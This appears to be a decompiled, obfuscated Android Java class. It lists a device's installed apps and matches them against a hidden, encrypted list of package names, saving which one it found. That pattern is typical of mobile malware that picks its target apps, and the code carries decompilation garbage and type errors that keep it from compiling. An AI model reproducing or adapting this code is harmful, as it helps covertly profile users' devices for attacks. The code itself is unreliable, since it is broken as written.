package com.mrn.ben;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

public final class xg
{
  private static int ln;
  private static final byte[] sc;
  private static String wu;
  
  public xg() {}
  
  private static String sc(int paramInt)
  {
    return wu((byte)sc['ł'], (byte)sc[''], (byte)sc[21]).intern().substring(wu((byte)sc['ł'], (byte)sc[''], (byte)sc[21]).intern().length() - paramInt);
  }
  
  private static List<String> sc(String paramString)
  {
    paramString = new StringTokenizer(paramString);
    ArrayList localArrayList = new ArrayList(paramString.countTokens());
    while (paramString.hasMoreTokens()) {
      localArrayList.add(paramString.nextToken().trim());
    }
    return localArrayList;
  }
  
  private static String wu()
    throws Exception
  {
    if (wu.equals(wu((byte)sc['ł'], (byte)sc[''], (byte)sc[21]).intern())) {
      return kp.wu(wu(jv.wu.length), sc(jv.wu.length));
    }
    return wu(0);
  }
  
  private static String wu(int paramInt)
  {
    return wu.substring(jv.wu.length - jv.wu.length, wu.length() - paramInt);
  }
  
  private static String wu(int paramInt1, byte paramByte, int paramInt2)
  {
    paramInt1 += 4;
    byte[] arrayOfByte1 = sc;
    int j = 0;
    int n = 0;
    int m = 9844 - paramByte * 9839;
    paramInt2 = paramInt2 * 12 + 98;
    byte[] arrayOfByte2 = new byte[m];
    int k = paramInt1;
    paramByte = paramInt2;
    if (arrayOfByte1 == null)
    {
      paramByte = m;
      j = paramInt2;
      paramInt2 = paramInt1;
      paramInt1 = n;
    }
    for (;;)
    {
      paramByte += -j;
      k = paramInt2;
      j = paramInt1;
      paramInt1 = j + 1;
      int i = (byte)paramByte;
      paramInt2 = k + 1;
      arrayOfByte2[j] = i;
      if (paramInt1 == m) {
        return new String(arrayOfByte2, 0);
      }
      j = arrayOfByte1[paramInt2];
    }
  }
  
  private static List<String> wu(Context paramContext, boolean paramBoolean)
  {
    ArrayList localArrayList = new ArrayList();
    paramContext = paramContext.getPackageManager().getInstalledPackages(jv.wu.length - jv.wu.length);
    int i = 0;
    while (i < paramContext.size())
    {
      PackageInfo localPackageInfo = (PackageInfo)paramContext.get(i);
      if ((paramBoolean) || (localPackageInfo.versionName != null)) {
        localArrayList.add(localPackageInfo.packageName);
      }
      i += 1;
    }
    return localArrayList;
  }
  
  private static void wu(Context paramContext, int paramInt)
  {
    PreferenceManager.getDefaultSharedPreferences(paramContext).edit().putInt(wu((byte)sc[79], (byte)sc[21], (byte)sc['']).intern(), paramInt).apply();
  }
  
  public static boolean wu(Context paramContext)
    throws Exception
  {
    List localList = sc(wu());
    return wu(paramContext, wu(paramContext, false), localList);
  }
  
  private static boolean wu(Context paramContext, List<String> paramList1, List<String> paramList2)
  {
    int i = 0;
    while (i < paramList1.size())
    {
      int j = 0;
      while (j < paramList2.size())
      {
        if (((String)paramList1.get(i)).equals((String)paramList2.get(j)))
        {
          wu(paramContext, j);
          return true;
        }
        j += 1;
      }
      i += 1;
    }
    return false;
  }
  
  public static boolean wu(String paramString)
    throws Exception
  {
    return wu().contains(paramString);
  }
}
